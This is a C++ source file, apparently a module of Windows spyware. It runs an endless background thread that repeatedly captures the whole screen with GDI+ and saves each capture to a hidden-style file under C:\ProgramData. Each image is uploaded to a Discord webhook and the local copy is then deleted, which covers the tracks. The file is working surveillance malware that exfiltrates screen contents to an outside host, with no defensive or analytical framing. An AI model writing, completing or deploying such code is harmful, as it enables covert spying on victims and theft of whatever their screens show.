#include "screenshots.h"
#include "discord.h"
#include "config.h"
#include "contadores.h"

#include <gdiplus.h>
#include <shlwapi.h>
#include <thread>
#include <chrono>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shlwapi.lib")

using namespace Gdiplus;

static ULONG_PTR g_gdiplusToken = 0;

static void IniciarGDI() {
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);
}

bool CapturarPantalla(const std::wstring& ruta_salida) {
    int ancho  = GetSystemMetrics(SM_CXSCREEN);
    int alto   = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, ancho, alto);
    HBITMAP hOld    = (HBITMAP)SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, ancho, alto, hdcScreen, 0, 0, SRCCOPY);

    Bitmap bitmap(hBitmap, NULL);

    CLSID pngClsid;
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) {
        SelectObject(hdcMem, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return false;
    }

    ImageCodecInfo* codecs = (ImageCodecInfo*)malloc(size);
    GetImageEncoders(num, size, codecs);
    for (UINT i = 0; i < num; i++) {
        if (wcscmp(codecs[i].MimeType, L"image/png") == 0) {
            pngClsid = codecs[i].Clsid;
            break;
        }
    }
    free(codecs);

    Status status = bitmap.Save(ruta_salida.c_str(), &pngClsid, NULL);

    SelectObject(hdcMem, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return status == Ok;
}

void HiloScreenshots() {
    IniciarGDI();

    int contador = 0;
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(INTERVALO_SCREENSHOT_MS));

        contador++;
        g_capturas_totales++;

        std::wstring ruta = L"C:\\ProgramData\\.shot.png";
        if (CapturarPantalla(ruta)) {
            std::wstring comentario = L"📸 **Captura #" + std::to_wstring(contador) + L"**";
            DiscordEnviarArchivo(WEBHOOK_PANTALLAS, ruta, comentario);
            DeleteFileW(ruta.c_str());
        }
    }
}